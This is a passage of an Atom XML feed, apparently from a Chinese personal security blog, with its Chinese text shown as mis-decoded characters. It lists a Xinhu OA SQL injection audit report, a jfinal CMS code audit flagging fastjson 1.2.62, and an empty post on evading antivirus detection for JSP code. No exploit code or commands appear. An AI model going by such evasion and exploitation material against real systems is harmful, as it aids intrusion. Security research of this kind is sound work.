grepæœç´¢</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š&quot;&gt;&lt;a href=&quot;#ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA-v2-7-0-è§£å¯†SQLæ³¨å…¥æ¼æ´å®¡è®¡æŠ¥å‘Š&quot; class=&quot;headerlink&quot; title=&quot;ã€æœ€ç»ˆå®Œæ•´ç‰ˆã€‘ä¿¡å‘¼OA v2.7.0 - è§£å¯†SQLæ³¨å…¥</summary>
      
    
    
    
    <category term="WEBå®‰å…¨" scheme="https://250wuyifan.github.io/categories/WEB%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="WEBå®‰å…¨" scheme="https://250wuyifan.github.io/tags/WEB%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>jfinal CMSä»£ç å®¡è®¡</title>
    <link href="https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <id>https://250wuyifan.github.io/2025/10/06/jfinal%20CMS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</id>
    <published>2025-10-06T12:24:25.000Z</published>
    <updated>2025-10-07T08:06:57.912Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ­å»º"><a href="#æ­å»º" class="headerlink" title="æ­å»º"></a>æ­å»º</h1><p><img src="https://raw.githubusercontent.com/250wuyifan/WaiLian250/main/img/image-20251006204921827.png" alt="image-20251006204921827"></p><h1 id="æœ‰æ¼æ´çš„ç»„ä»¶"><a href="#æœ‰æ¼æ´çš„ç»„ä»¶" class="headerlink" title="æœ‰æ¼æ´çš„ç»„ä»¶"></a>æœ‰æ¼æ´çš„ç»„ä»¶</h1><h2 id="fastjson-1-2-62-æé«˜é£é™©"><a href="#fastjson-1-2-62-æé«˜é£é™©" class="headerlink" title="fastjson 1.2.62 - æé«˜é£é™©"></a>fastjson 1.2.62 - æé«˜é£é™©</h2><p><a href="https://www.freebuf.com/articles/web/418403.html">https://www.freebuf.com/articles/web/418403.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ­å»º&quot;&gt;&lt;a href=&quot;#æ­å»º&quot; class=&quot;headerlink&quot; title=&quot;æ­å»º&quot;&gt;&lt;/a&gt;æ­å»º&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/250wuyifan/WaiLian250/main</summary>
      
    
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/categories/java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="javaå®‰å…¨" scheme="https://250wuyifan.github.io/tags/java%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>åˆæ¢JSPå…æ€</title>
    <link href="https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/"/>
    <id>https://250wuyifan.github.io/2025/10/04/%E5%88%9D%E6%8E%A2JSP%E5%85%8D%E6%9D%80/</id>
    <published>2025-10-04T14:58:48.000Z</published>
    <updated>2025-10-04T15:00:19.980Z</updated>
    
    
    
    
    
    <category term="å…æ€" scheme="https://250wuyifan.github.io/tags/%E5%85%8D%E6%9D%80/"/>
    
  </entry>
  
</feed>
